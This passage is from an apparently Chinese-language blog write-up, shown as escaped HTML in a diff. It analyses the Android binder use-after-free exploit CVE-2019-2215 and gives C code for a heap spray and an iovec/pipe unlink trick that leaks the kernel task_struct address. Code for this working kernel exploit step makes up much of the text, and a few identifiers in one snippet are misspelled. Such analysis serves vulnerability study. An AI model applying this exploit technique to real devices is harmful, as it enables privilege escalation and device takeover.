+        &lt;span style=&#34;color:#66d9ef&#34;&gt;unsigned&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;   flags;          &lt;span style=&#34;color:#75715e&#34;&gt;/* low level flags */&lt;/span&gt;
+        mm_segment_t    addr_limit;     &lt;span style=&#34;color:#75715e&#34;&gt;/* address limit */&lt;/span&gt;
+        &lt;span style=&#34;color:#75715e&#34;&gt;#ifdef CONFIG_ARM64_SW_TTBR0_PAN
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        u64             ttbr0;          &lt;span style=&#34;color:#75715e&#34;&gt;/* saved TTBR0_EL1 */&lt;/span&gt;
+        &lt;span style=&#34;color:#75715e&#34;&gt;#endif
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;             preempt_count;  &lt;span style=&#34;color:#75715e&#34;&gt;/* 0 =&amp;gt; preemptable, &amp;lt;0 =&amp;gt; bug */&lt;/span&gt;
+        ...
+};
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;这里&lt;code&gt;addr_limit&lt;/code&gt;的offset是和机器architecture相关的,上面提供的是针对arm64的对应结构的截图，可以看到&lt;code&gt;task_struct&lt;/code&gt;的第一个field为&lt;code&gt;thread_info&lt;/code&gt;,&lt;code&gt;addr_limit&lt;/code&gt;是在&lt;code&gt;thread_info&lt;/code&gt;的&lt;strong&gt;0x8&lt;/strong&gt;偏移处，所以我们在拿到&lt;code&gt;task_struct&lt;/code&gt;的地址后，&lt;strong&gt;0x8&lt;/strong&gt; offset处即为&lt;code&gt;addr_limit&lt;/code&gt;。&lt;/p&gt;
+&lt;h3 id=&#34;23-leaking-task_structure&#34;&gt;2.3 Leaking Task_Structure&lt;/h3&gt;
+&lt;p&gt;现在和目标结构题相关的信息，需要注意去bypass的点，以及具体利用unlink的点我们已经大概清楚：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;binder_thread 的size为0x198
+&lt;ul&gt;
+&lt;li&gt;wait 的offset为0xa0
+&lt;ul&gt;
+&lt;li&gt;wait.lock的值必须为0,否则执行流无法走到unlink处&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;task 的offset为 0x190
+&lt;ul&gt;
+&lt;li&gt;这里我们要leak前次binder_thread的task数据，所以我们在overlap的时候不能覆盖到0x190之后的内容。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;arm64下addr_limit位于task_struct 的0x8处&lt;/li&gt;
+&lt;li&gt;iovec的size为0x10
+&lt;ul&gt;
+&lt;li&gt;iovec.base 必须是指向用户地址，否则不能通过传入kernel时的校验&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;所以为了能有较大几率在内核复用被释放的binder_thread使用的内存，我们需要
+准备一个大小类似的&lt;code&gt;iovec&lt;/code&gt; array，再加上我们不能覆盖想要leak的前一个&lt;code&gt;binder_thread.task&lt;/code&gt;的内容，所以我们需要准备&lt;code&gt;0x190 / 0x10 = 0x19&lt;/code&gt; 个iovec，即&lt;code&gt;iovec[25]&lt;/code&gt;，而且为了能利用wait去实现unlink，所以&lt;code&gt;iovec[0xa0 / 0x10]&lt;/code&gt;处要准备上符合要求且精心构造的数据。这里借用P0博客里的图片展示内存对应关系：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/leak_task_struct.png&#34; alt=&#34;leak task_struct&#34;&gt;&lt;/p&gt;
+&lt;p&gt;在确定大概的对应的关系后，我们还需要让相关内存块的内容满足如下要求：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;wait.lock&lt;/code&gt; 需要为&lt;strong&gt;0x0&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;iovec.base&lt;/code&gt; 必须指向用户空间地址&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;wait.task_list.next&lt;/code&gt;和&lt;code&gt;wait.task_list.prev&lt;/code&gt;在unlink后都会指向&lt;code&gt;wait.task_list.next&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;为了实现这个要求，P0在原文中使用了如下的数据来填充关键内存块：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/heap_layout_leaking_task.jpg&#34; alt=&#34;heap layout for leaking task&#34;&gt;&lt;/p&gt;
+&lt;p&gt;相关代码如下：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;14
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;15
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;16
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;17
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;18
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;19
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;20
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;21
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;22
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;23
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;24
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;25
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;26
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BINDER_THREAD_EXIT 0x40046208ul
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// NOTE: we don&amp;#39;t cover the task_struct* here; we want to leave it uninitialized
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define BINDER_THREAD_SZ 0x190
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define IOVEC_ARRAY_SZ (BINDER_THREAD_SZ / 16) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//25
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define WAITQUEUE_OFFSET 0xA0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#define IOVEC_INDX_FOR_WQ (WAITQUEUE_OFFSET / 16) &lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;//10
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
+&lt;span style=&#34;color:#75715e&#34;&gt;// Alloc a userspace memory which will satisfy wait.lock == 0
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// and iovec.base point to userspace
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;dummy_page_4g_aligned &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mmap((&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0x100000000UL&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x2000&lt;/span&gt;, PROT_READ&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;PROT_WRITE, MAP_PRIVATE&lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt;MAP_ANONYMOUS, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// Forming iovec[25]
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;iovec&lt;/span&gt; iovec_array[IOVEC_ARRAY_SZ];
+memset(iovec_array, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#66d9ef&#34;&gt;sizeof&lt;/span&gt;(iovec_array));
+
+iovec_array[IOVEC_INDX_FOR_WQ].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dummy_page_4g_aligned; &lt;span style=&#34;color:#75715e&#34;&gt;/* spinlock in the low address half must be zero */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;next */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_base &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBEEF&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;/* wq-&amp;gt;task_list-&amp;gt;prev */&lt;/span&gt;
+iovec_array[IOVEC_INDX_FOR_WQ &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;].iov_len &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; b;
+
+&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (pipe(pipefd)) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pipe&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (fcntl(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;], F_SETPIPE_SZ, &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;) err(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;pipe size&amp;#34;&lt;/span&gt;);
+&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; page_buffer[&lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;];
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;code&gt;iovec[0]&lt;/code&gt;到&lt;code&gt;iovec[9]&lt;/code&gt;里的内容都是&lt;strong&gt;0x0&lt;/strong&gt;，对于&lt;code&gt;iovec.base&lt;/code&gt;和&lt;code&gt;iovec.len&lt;/code&gt;都为&lt;strong&gt;0x0&lt;/strong&gt;的元素，在写入和读出时将直接跳过。
+对于&lt;code&gt;iovec[10]&lt;/code&gt;(对应于&lt;code&gt;wait.lock&lt;/code&gt;和&lt;code&gt;wait.task_list.next&lt;/code&gt;)和&lt;code&gt;iovec[11]&lt;/code&gt;(对应于&lt;code&gt;wait.task_list.prev&lt;/code&gt;)，则填入我们精心构造的数据: 为了满足&lt;code&gt;wait.lock&lt;/code&gt;(32bit)为&lt;strong&gt;0x0&lt;/strong&gt;且&lt;code&gt;iovec.base&lt;/code&gt;指向用户空间，我们需要申请一个低32bit全为0的用户空间内存块，P0原文里申请的是&lt;code&gt;0x100000000UL&lt;/code&gt;，刚好满足上述两个要求。&lt;/p&gt;
+&lt;p&gt;前面已经分析过，在触发unlink时，&lt;code&gt;binder_thread.wait&lt;/code&gt;是head，对应于&lt;code&gt;eppoll_entry.whead&lt;/code&gt;，而要删除的元素对应于&lt;code&gt;eppoll_entry.wait&lt;/code&gt;，而要删除的元素是当前list里面唯一的元素，所以删除后留下的只有&lt;code&gt;eppoll_entry.whead&lt;/code&gt;本身，此时head的next和prev都指向其自己。这里直接引用P0的解释图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/CVE-2019-2215-UAF-before-list_del.png&#34; alt=&#34;before list del&#34;&gt;
+&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/CVE-2019-2215-UAF-post-list_del.png&#34; alt=&#34;after list del&#34;&gt;&lt;/p&gt;
+&lt;p&gt;unlink前，&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;eppoll_entry.whead&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1000&lt;/span&gt;;
+eppoll_entry.whaed&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0xDEADBEEF&lt;/span&gt;;
+
+eppoll_entry.wait&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eppoll_entry.whead;
+eppoll_entry.wait&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; eppoll_entry.wheah;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;unlink时，根据&lt;code&gt;list_del&lt;/code&gt;的代码：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 2
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 3
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 4
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 5
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 6
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 7
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 8
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt; 9
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;10
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;11
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;12
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;13
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_del&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;entry)
+{
+        __list_del(entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev, entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next);
+        entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LIST_POISON1;
+        entry&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; LIST_POISON2;
+}
+
+&lt;span style=&#34;color:#75715e&#34;&gt;// Here prev, next all point whead.
+&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;inline&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;__list_del&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; prev, &lt;span style=&#34;color:#66d9ef&#34;&gt;struct&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;list_head&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; next)
+{
+        next&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;prev &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; prev;
+        WRITE_ONCE(prev&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;next, next);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;则unlink完成后，内存布局如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://blog.exiahan.com/images/cve20192215/leak_task_after_unlink.jpg&#34; alt=&#34;leaking task after unlink&#34;&gt;&lt;/p&gt;
+&lt;p&gt;这里需要注意的是，在开始触发unlink前，会先在父进程用&lt;code&gt;writev&lt;/code&gt;阻塞管道(前面已经把pipe的buffer设置为0x1000)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;1
+&lt;/span&gt;&lt;span style=&#34;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;;width:100%&#34;&gt;
+&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cpp&#34; data-lang=&#34;cpp&#34;&gt;ioctl(binder_fd, BINDER_THREAD_EXIT, NULL);
+b &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; writev(pipefd[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;], iovec_array, IOVEC_ARRAY_SZ);
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;ul&gt;
+&lt;li&gt;在unlink前，父进程&lt;code&gt;writev&lt;/code&gt;将&lt;code&gt;iovec[10]&lt;/code&gt;指向的&lt;code&gt;dummy_page_4g_aligned&lt;/code&gt;内存块的&lt;code&gt;0x1000&lt;/code&gt;内存读出写入pipe，而后阻塞。&lt;/li&gt;
+&lt;li&gt;而后子进程触发unlink，改写&lt;code&gt;iovec[11].iov_base&lt;/code&gt;为指向&lt;code&gt;&amp;amp;iovec[10].iov_len&lt;/code&gt;的指针，接着使用&lt;code&gt;readv&lt;/code&gt;读出已经被&lt;code&gt;writev&lt;/code&gt;写入pipe的&lt;code&gt;dummy_page_4g_aligned&lt;/code&gt;内容&lt;/li&gt;
+&lt;li&gt;此时&lt;code&gt;writev&lt;/code&gt;读取&lt;code&gt;iovec[11].iov_base&lt;/code&gt;的内容(此时已被改写为指向&lt;code&gt;binder_thread.wait.task_list&lt;/code&gt;的指针)，父进程再次调用&lt;code&gt;readv&lt;/code&gt;，成功读出被释放从&lt;code&gt;binder_thread.wait.task_list&lt;/code&gt;开始的&lt;code&gt;0x1000&lt;/code&gt;字节内容到&lt;code&gt;buffer&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;此时&lt;code&gt;buffer + 0xE8&lt;/code&gt;即为&lt;code&gt;task&lt;/code&gt;指针值。从而成功拿到当前进程的&lt;code&gt;task_struct&lt;/code&gt;结构体地址(&lt;code&gt;wait&lt;/code&gt;偏移为&lt;code&gt;0xa0&lt;/code&gt;, &lt;code&gt;task&lt;/code&gt;偏移为&lt;code&gt;0x190&lt;/code&gt;，&lt;code&gt;wait.task_list&lt;/code&gt;在&lt;code&gt;wait + 0x8&lt;/code&gt;处，所以distance为&lt;code&gt;0x190-0xa0-0x8 = 0xe8&lt;/code&gt;)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;
+&lt;table style=&#34;border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;&#34;&gt;&lt;tr&gt;&lt;td style=&#34;vertical-align:top;padding:0;margin:0;border:0;&#34;&gt;
